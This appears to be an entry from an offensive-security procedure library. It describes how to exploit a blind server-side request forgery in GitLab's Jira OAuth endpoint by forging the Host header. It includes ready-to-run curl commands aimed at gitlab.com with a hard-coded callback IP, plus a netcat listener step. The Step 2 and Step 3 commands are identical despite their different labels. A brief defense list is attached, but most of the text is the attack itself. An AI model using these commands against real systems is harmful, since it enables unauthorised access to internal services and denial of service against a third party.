---
id: proc-uuid-002
tags:
  - ssrf
  - blind-ssrf
  - host-header
  - oauth
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-trigger-gitlab-ssrf]]'
  - '[[commands/curl-demonstrate-ssrf-timeout]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T17:30:58.407Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Trigger-SSRF-with-Manipulated-Host-Header

## Summary

This procedure exploits the blind SSRF in GitLab's Jira OAuth endpoint by forging the Host header in a POST request, causing the server to route internal HTTP/HTTPS requests to attacker-specified hosts, enabling access to internal services.

## Description

The root cause is the use of Rails URL helpers in Gitlab::HTTP.post for constructing oauth_token_url, which trusts the client-supplied Host header without validation. With allow_local_requests:true, this permits requests to local/internal IPs. No authentication is needed, leading to high integrity risks if internal endpoints are exposed, and minor DoS from thread-blocking timeouts.

## Requirements

1. Accessible GitLab instance (vulnerable version)
2. Knowledge of an internal target host/port (e.g., 162.243.147.21:81)
3. curl installed on the attacking machine
4. Network connectivity to the GitLab endpoint

## Defense

Defensive measures and detection strategies:

- Implement strict Host header validation in controllers
- Use request signing or IP allowlisting for internal HTTP calls
- Log and alert on requests with mismatched or suspicious Host headers
- Apply rate limiting to OAuth endpoints to mitigate DoS

## Objectives

1. Trigger arbitrary internal requests via SSRF
2. Demonstrate integrity compromise potential
3. Highlight availability impact from timeouts

## Instructions

### Step 1: Prepare the Target Listener

**Context**: Ensure a listener is ready on the internal target to capture the SSRF request (cross-references Step 3 procedure).

No command here; set up nc listener as per [[procedures/Observe-SSRF-Request-with-Netcat]].

### Step 2: Send Manipulated POST Request

**Context**: Execute the SSRF trigger using a forged Host header to redirect the internal callback.

**Command** ([[commands/curl-trigger-gitlab-ssrf]]):

```bash
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

> This sends a POST to the endpoint; GitLab interprets the Host as the callback target, forwarding via Gitlab::HTTP.post. Expect a JSON-like response (e.g., {"access_token":null}) after ~60s timeout if no response from internal host.

### Step 3: Measure Timeout Impact

**Context**: Repeat with a non-responsive target to show DoS effect.

**Command** ([[commands/curl-demonstrate-ssrf-timeout]]):

```bash
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

> Demonstrates 1:00.76 total time, blocking a thread for 60s.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-gitlab-ssrf]]
- [[commands/curl-demonstrate-ssrf-timeout]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- blind-ssrf
- host-header
- oauth
